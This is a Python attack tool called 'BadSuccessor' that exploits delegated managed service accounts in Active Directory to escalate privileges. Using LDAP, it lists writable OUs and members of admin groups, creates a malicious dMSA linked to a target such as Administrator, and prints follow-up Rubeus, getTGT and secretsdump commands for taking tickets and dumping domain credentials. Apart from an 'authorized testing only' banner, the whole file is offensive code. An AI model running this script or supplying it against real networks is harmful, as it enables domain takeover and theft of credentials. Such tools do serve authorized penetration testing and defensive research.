#!/usr/bin/env python3
"""
BadSuccessor - dMSA Privilege Escalation Tool (Linux Version)
Author: Based on research by Yuval Gordon (Akamai)
Description: Tool to exploit dMSA vulnerability for privilege escalation in Active Directory
Platform: Linux (non-domain joined)
Warning: For authorized penetration testing only
"""

import argparse
import sys
import subprocess
import json
import socket
import struct
import base64
import hashlib
import hmac
import time
from datetime import datetime
import re
import os
import binascii
from urllib.parse import quote

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, MODIFY_REPLACE, MODIFY_ADD
    from ldap3.core.exceptions import LDAPException
except ImportError:
    print("Error: ldap3 library required. Install with: pip3 install ldap3")
    sys.exit(1)

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket import version
    from impacket.dcerpc.v5 import transport, epm
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
except ImportError:
    print("Error: impacket library required. Install with: pip3 install impacket")
    sys.exit(1)

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class BadSuccessor:
    def __init__(self):
        self.banner = f"""
{Colors.RED}{Colors.BOLD}
██████╗  █████╗ ██████╗ ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗ ██████╗ ██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔═══██╗██╔══██╗
██████╔╝███████║██║  ██║███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗██║   ██║██████╔╝
██╔══██╗██╔══██║██║  ██║╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║██║   ██║██╔══██╗
██████╔╝██║  ██║██████╔╝███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{Colors.END}
{Colors.CYAN}dMSA Privilege Escalation Tool - Linux Edition{Colors.END}
{Colors.YELLOW}Warning: For authorized penetration testing only!{Colors.END}
"""
        self.dc_ip = None
        self.domain = None
        self.username = None
        self.password = None
        self.connection = None
        self.domain_dn = None

    def print_banner(self):
        print(self.banner)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": Colors.BLUE,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED,
            "CRITICAL": Colors.PURPLE
        }
        color = colors.get(level, Colors.WHITE)
        print(f"[{timestamp}] {color}[{level}]{Colors.END} {message}")

    def discover_domain_controller(self, domain):
        """Discover domain controller via DNS SRV record"""
        try:
            import dns.resolver
            srv_record = f"_ldap._tcp.{domain}"
            answers = dns.resolver.resolve(srv_record, 'SRV')
            for answer in answers:
                dc_hostname = str(answer.target).rstrip('.')
                try:
                    dc_ip = socket.gethostbyname(dc_hostname)
                    self.log(f"Found DC: {dc_hostname} ({dc_ip})", "SUCCESS")
                    return dc_ip, dc_hostname
                except socket.gaierror:
                    continue
        except ImportError:
            self.log("DNS resolution requires dnspython: pip3 install dnspython", "WARNING")
        except Exception as e:
            self.log(f"DNS discovery failed: {e}", "WARNING")

        return None, None

    def establish_ldap_connection(self, dc_ip, domain, username, password):
        """Establish authenticated LDAP connection"""
        try:
            server = Server(dc_ip, port=389, get_info=ALL)
            user_dn = f"{domain}\\{username}"

            self.log(f"Connecting to LDAP server: {dc_ip}", "INFO")
            conn = Connection(server, user=user_dn, password=password, authentication=NTLM, auto_bind=True)

            if conn.bind():
                self.log("LDAP authentication successful", "SUCCESS")

                # Get domain DN
                domain_parts = domain.split('.')
                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
                self.log(f"Domain DN: {self.domain_dn}", "INFO")

                return conn
            else:
                self.log("LDAP authentication failed", "ERROR")
                return None

        except Exception as e:
            self.log(f"LDAP connection error: {e}", "ERROR")
            return None

    def check_server_2025_dcs(self):
        """Check for Windows Server 2025 domain controllers"""
        self.log("Checking for Windows Server 2025 Domain Controllers...")

        try:
            search_filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['name', 'operatingSystem', 'operatingSystemVersion']
            )

            server_2025_found = False
            for entry in self.connection.entries:
                os_info = str(entry.operatingSystem) if entry.operatingSystem else "Unknown"
                if "2025" in os_info or "Server 2025" in os_info:
                    self.log(f"Found Server 2025 DC: {entry.name} - {os_info}", "WARNING")
                    server_2025_found = True
                elif "Server" in os_info:
                    self.log(f"Found DC: {entry.name} - {os_info}", "INFO")

            if server_2025_found:
                self.log("dMSA feature likely available (Server 2025 DC found)", "SUCCESS")
                return True
            else:
                self.log("No Server 2025 DCs found - dMSA feature may not be available", "WARNING")
                return False

        except Exception as e:
            self.log(f"Error checking DCs: {e}", "ERROR")
            return False

    def enumerate_ou_permissions(self):
        """Enumerate OUs where current user might have create permissions"""
        self.log("Enumerating Organizational Units...")

        try:
            search_filter = "(objectClass=organizationalUnit)"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName', 'name', 'nTSecurityDescriptor']
            )

            writable_ous = []
            for entry in self.connection.entries:
                ou_dn = str(entry.distinguishedName)
                ou_name = str(entry.name)

                # Test write access by attempting to read security descriptor
                if self.test_ou_write_access(ou_dn):
                    writable_ous.append(ou_dn)
                    self.log(f"Potentially writable OU: {ou_name} ({ou_dn})", "SUCCESS")
                else:
                    self.log(f"Found OU: {ou_name}", "INFO")

            return writable_ous

        except Exception as e:
            self.log(f"Error enumerating OUs: {e}", "ERROR")
            return []

    def test_ou_write_access(self, ou_dn):
        """Test if current user has write access to an OU"""
        try:
            # Attempt to read the security descriptor
            self.connection.search(
                search_base=ou_dn,
                search_filter="(objectClass=*)",
                search_scope='BASE',
                attributes=['nTSecurityDescriptor']
            )

            # If we can read the security descriptor, we might have some access
            # This is a simplified check - in a real scenario, you'd parse the ACL
            return len(self.connection.entries) > 0

        except Exception:
            return False

    def create_dmsa_object(self, ou_dn, dmsa_name):
        """Create a dMSA object using LDAP"""
        self.log(f"Creating dMSA object: {dmsa_name} in {ou_dn}")

        try:
            dmsa_dn = f"CN={dmsa_name},{ou_dn}"

            # dMSA object attributes
            attributes = {
                'objectClass': ['top', 'msDS-GroupManagedServiceAccount', 'msDS-DelegatedManagedServiceAccount'],
                'sAMAccountName': f"{dmsa_name}$",
                'userAccountControl': '4096',  # WORKSTATION_TRUST_ACCOUNT
                'msDS-DelegatedMSAState': '0',  # Initial state
                'dNSHostName': f"{dmsa_name.lower()}.{self.domain}",
                'servicePrincipalName': [f"HOST/{dmsa_name.lower()}.{self.domain}"],
                'msDS-SupportedEncryptionTypes': '28'  # AES256, AES128, RC4
            }

            # Add the object
            success = self.connection.add(dmsa_dn, attributes=attributes)

            if success:
                self.log(f"Successfully created dMSA: {dmsa_dn}", "SUCCESS")
                return dmsa_dn
            else:
                self.log(f"Failed to create dMSA: {self.connection.result}", "ERROR")
                return None

        except Exception as e:
            self.log(f"Error creating dMSA: {e}", "ERROR")
            return None

    def get_user_dn(self, username):
        """Get the distinguished name of a user"""
        try:
            search_filter = f"(&(objectClass=user)(sAMAccountName={username}))"
            self.connection.search(
                search_base=self.domain_dn,
                search_filter=search_filter,
                attributes=['distinguishedName']
            )

            if self.connection.entries:
                user_dn = str(self.connection.entries[0].distinguishedName)
                self.log(f"Found target user DN: {user_dn}", "SUCCESS")
                return user_dn
            else:
                self.log(f"User not found: {username}", "ERROR")
                return None

        except Exception as e:
            self.log(f"Error finding user: {e}", "ERROR")
            return None

    def simulate_dmsa_migration(self, dmsa_dn, target_user_dn):
        """Simulate dMSA migration by setting the critical attributes"""
        self.log(f"Simulating dMSA migration to target: {target_user_dn}")

        try:
            # Set msDS-ManagedAccountPrecededByLink to target user
            changes = {
                'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [target_user_dn])],
                'msDS-DelegatedMSAState': [(MODIFY_REPLACE, ['2'])]  # Migration completed
            }

            success = self.connection.modify(dmsa_dn, changes)

            if success:
                self.log("Successfully simulated dMSA migration!", "CRITICAL")
                self.log("dMSA should now inherit target user's privileges", "CRITICAL")
                return True
            else:
                self.log(f"Failed to modify dMSA: {self.connection.result}", "ERROR")
                return False

        except Exception as e:
            self.log(f"Error simulating migration: {e}", "ERROR")
            return False

    def verify_dmsa_configuration(self, dmsa_dn):
        """Verify the dMSA configuration"""
        self.log("Verifying dMSA configuration...")

        try:
            self.connection.search(
                search_base=dmsa_dn,
                search_filter="(objectClass=*)",
                search_scope='BASE',
                attributes=['msDS-ManagedAccountPrecededByLink', 'msDS-DelegatedMSAState', 'sAMAccountName']
            )

            if self.connection.entries:
                entry = self.connection.entries[0]
                preceded_by = str(entry['msDS-ManagedAccountPrecededByLink']) if entry['msDS-ManagedAccountPrecededByLink'] else "Not set"
                state = str(entry['msDS-DelegatedMSAState']) if entry['msDS-DelegatedMSAState'] else "Not set"
                sam_name = str(entry['sAMAccountName']) if entry['sAMAccountName'] else "Not set"

                self.log(f"dMSA SAM Account Name: {sam_name}", "INFO")
                self.log(f"Preceded By Link: {preceded_by}", "INFO")
                self.log(f"Migration State: {state}", "INFO")

                if state == "2" and preceded_by != "Not set":
                    self.log("dMSA configuration looks correct for privilege escalation!", "SUCCESS")
                    return True
                else:
                    self.log("dMSA configuration incomplete", "WARNING")
                    return False
            else:
                self.log("Could not retrieve dMSA configuration", "ERROR")
                return False

        except Exception as e:
            self.log(f"Error verifying dMSA: {e}", "ERROR")
            return False

    def enumerate_high_value_targets(self):
        """Enumerate high-value targets for privilege escalation"""
        self.log("Enumerating high-value targets...")

        high_value_groups = [
            "Domain Admins",
            "Enterprise Admins",
            "Schema Admins",
            "Administrators"
        ]

        targets = {}

        for group in high_value_groups:
            try:
                search_filter = f"(&(objectClass=group)(cn={group}))"
                self.connection.search(
                    search_base=self.domain_dn,
                    search_filter=search_filter,
                    attributes=['member']
                )

                if self.connection.entries:
                    group_entry = self.connection.entries[0]
                    members = []

                    if group_entry.member:
                        for member_dn in group_entry.member:
                            # Extract username from DN
                            member_search = f"(distinguishedName={member_dn})"
                            self.connection.search(
                                search_base=self.domain_dn,
                                search_filter=member_search,
                                attributes=['sAMAccountName']
                            )

                            if self.connection.entries:
                                username = str(self.connection.entries[0].sAMAccountName)
                                members.append(username)

                    if members:
                        targets[group] = members
                        self.log(f"{group}:", "INFO")
                        for member in members:
                            self.log(f"  - {member}", "INFO")

            except Exception as e:
                self.log(f"Error enumerating {group}: {e}", "WARNING")

        # Always add built-in Administrator
        targets["Built-in"] = ["Administrator"]
        self.log("Built-in Administrator: Administrator", "INFO")

        return targets

    def cleanup_dmsa(self, dmsa_dn):
        """Clean up the created dMSA"""
        self.log(f"Cleaning up dMSA: {dmsa_dn}")

        try:
            success = self.connection.delete(dmsa_dn)

            if success:
                self.log("Successfully cleaned up dMSA", "SUCCESS")
                return True
            else:
                self.log(f"Failed to clean up dMSA: {self.connection.result}", "WARNING")
                return False

        except Exception as e:
            self.log(f"Error cleaning up dMSA: {e}", "ERROR")
            return False

    def generate_attack_commands(self, dmsa_name, domain):
        """Generate commands for next steps with other tools"""
        self.log("Attack completed! Next steps:", "CRITICAL")
        self.log("", "INFO")
        self.log("1. Request TGT using Rubeus (on Windows machine):", "INFO")
        self.log(f"   Rubeus.exe asktgs /targetuser:{dmsa_name}$ /service:krbtgt/{domain} /dmsa /opsec /nowrap /ptt", "INFO")
        self.log("", "INFO")
        self.log("2. Or use impacket-getTGT (Linux):", "INFO")
        self.log(f"   getTGT.py {domain}/{dmsa_name}$ -dc-ip {self.dc_ip} -no-pass -k", "INFO")
        self.log("", "INFO")
        self.log("3. Use obtained credentials for further attacks:", "INFO")
        self.log(f"   secretsdump.py {domain}/{dmsa_name}$@{self.dc_ip} -just-dc -k", "INFO")
        self.log("", "INFO")
        self.log("Note: The dMSA ticket should contain the target user's privileges in the PAC!", "CRITICAL")

def main():
    parser = argparse.ArgumentParser(
        description="BadSuccessor - dMSA Privilege Escalation Tool (Linux)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --enumerate
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --attack --target Administrator
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --targets
  python3 badsuccessor.py -d domain.com -u user -p password --dc-ip 192.168.1.10 --cleanup --dmsa-dn "CN=evil_dmsa,OU=temp,DC=domain,DC=com"
        """
    )

    # Connection parameters
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., domain.com)')
    parser.add_argument('-u', '--username', required=True, help='Username for authentication')
    parser.add_argument('-p', '--password', required=True, help='Password for authentication')
    parser.add_argument('--dc-ip', help='Domain Controller IP (auto-discover if not specified)')

    # Actions
    parser.add_argument('--enumerate', action='store_true', help='Enumerate vulnerable OUs')
    parser.add_argument('--attack', action='store_true', help='Perform the BadSuccessor attack')
    parser.add_argument('--target', help='Target user to escalate to (e.g., Administrator)')
    parser.add_argument('--dmsa-name', default='evil_dmsa', help='Name for the malicious dMSA (default: evil_dmsa)')
    parser.add_argument('--ou-dn', help='Specific OU DN to use (auto-detect if not specified)')
    parser.add_argument('--cleanup', action='store_true', help='Clean up created dMSA')
    parser.add_argument('--dmsa-dn', help='dMSA DN for cleanup')
    parser.add_argument('--targets', action='store_true', help='Enumerate high-value targets')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')

    args = parser.parse_args()

    bs = BadSuccessor()

    if not args.no_banner:
        bs.print_banner()

    # Store credentials
    bs.domain = args.domain
    bs.username = args.username
    bs.password = args.password

    # Discover or use provided DC IP
    if args.dc_ip:
        bs.dc_ip = args.dc_ip
    else:
        bs.log("Discovering Domain Controller...", "INFO")
        bs.dc_ip, dc_hostname = bs.discover_domain_controller(args.domain)
        if not bs.dc_ip:
            bs.log("Could not discover DC. Please specify --dc-ip", "ERROR")
            sys.exit(1)

    # Establish LDAP connection
    bs.connection = bs.establish_ldap_connection(bs.dc_ip, args.domain, args.username, args.password)
    if not bs.connection:
        bs.log("Failed to establish LDAP connection", "ERROR")
        sys.exit(1)

    # Check for Server 2025 DCs
    bs.check_server_2025_dcs()

    try:
        # Handle different modes
        if args.targets:
            bs.enumerate_high_value_targets()
            return

        if args.enumerate:
            vulnerable_ous = bs.enumerate_ou_permissions()
            if vulnerable_ous:
                bs.log(f"Found {len(vulnerable_ous)} potentially writable OUs", "SUCCESS")
                for ou in vulnerable_ous:
                    bs.log(f"  - {ou}", "INFO")
            else:
                bs.log("No obviously writable OUs found", "WARNING")
            return

        if args.cleanup:
            if not args.dmsa_dn:
                bs.log("--dmsa-dn parameter required for cleanup", "ERROR")
                return
            bs.cleanup_dmsa(args.dmsa_dn)
            return

        if args.attack:
            if not args.target:
                bs.log("--target parameter required for attack", "ERROR")
                return

            # Find writable OU if not specified
            target_ou_dn = args.ou_dn
            if not target_ou_dn:
                vulnerable_ous = bs.enumerate_ou_permissions()
                if not vulnerable_ous:
                    bs.log("No writable OUs found. Try specifying --ou-dn manually", "ERROR")
                    return
                target_ou_dn = vulnerable_ous[0]
                bs.log(f"Using OU: {target_ou_dn}", "INFO")

            # Perform the attack
            bs.log("Starting BadSuccessor attack...", "CRITICAL")

            # Step 1: Create dMSA
            dmsa_dn = bs.create_dmsa_object(target_ou_dn, args.dmsa_name)
            if not dmsa_dn:
                return

            # Step 2: Get target user DN
            target_user_dn = bs.get_user_dn(args.target)
            if not target_user_dn:
                return

            # Step 3: Simulate migration
            if not bs.simulate_dmsa_migration(dmsa_dn, target_user_dn):
                return

            # Step 4: Verify configuration
            bs.verify_dmsa_configuration(dmsa_dn)

            # Step 5: Generate next steps
            bs.generate_attack_commands(args.dmsa_name, args.domain)

            bs.log(f"Remember to clean up with: --cleanup --dmsa-dn \"{dmsa_dn}\"", "WARNING")

        else:
            parser.print_help()

    finally:
        # Clean up connection
        if bs.connection:
            bs.connection.unbind()

if __name__ == "__main__":
    main()
